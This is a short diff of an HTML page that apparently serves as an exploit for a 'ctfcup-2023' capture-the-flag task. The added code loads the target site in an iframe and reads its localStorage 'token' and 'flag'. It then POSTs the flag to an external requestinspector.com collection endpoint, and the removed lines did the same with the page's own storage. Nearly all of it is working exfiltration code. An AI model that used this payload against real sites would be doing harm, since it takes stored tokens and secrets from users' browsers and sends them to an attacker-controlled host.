@@ -6,14 +6,22 @@
     </head>
     <body>
         <div id="123"></div>
+        <iframe src="https://static-mistakes-4a27e2504ec596fe.ctfcup-2023.ru/">
+        </iframe>
     </body>
     <script>
-        fetch(
-            'https://01hdwftvwz6fck8j6ntcdq26vs00-a22fe370aae401506893.requestinspector.com',
-            {
-                method: 'POST',
-                body: JSON.stringify({ a: localStorage.getItem('flag') }),
-            }
-        );
+        const a = document.querySelector('iframe');
+        setTimeout(() => {
+            console.log(a.contentWindow.localStorage.getItem('token'));
+            fetch(
+                'https://01hdwftvwz6fck8j6ntcdq26vs00-a22fe370aae401506893.requestinspector.com',
+                {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        a: a.contentWindow.localStorage.getItem('flag'),
+                    }),
+                }
+            );
+        }, 2000);
     </script>
 </html>
